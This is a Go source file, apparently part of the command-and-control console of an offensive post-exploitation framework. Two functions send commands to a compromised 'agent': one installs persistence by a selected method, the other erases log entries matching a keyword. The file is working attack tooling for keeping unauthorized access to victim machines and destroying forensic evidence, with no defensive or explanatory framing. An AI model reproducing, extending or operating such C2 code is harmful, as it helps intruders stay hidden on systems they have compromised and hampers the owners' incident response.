package cc

import (
	"fmt"

	"github.com/fatih/color"
)

func modulePersistence() {
	cmd := fmt.Sprintf("!persistence %s", Options["method"].Val)
	err := SendCmd(cmd, CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}

func moduleLogCleaner() {
	cmd := fmt.Sprintf("!clean_log %s", Options["keyword"].Val)
	err := SendCmd(cmd, CurrentTarget)
	if err != nil {
		CliPrintError("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
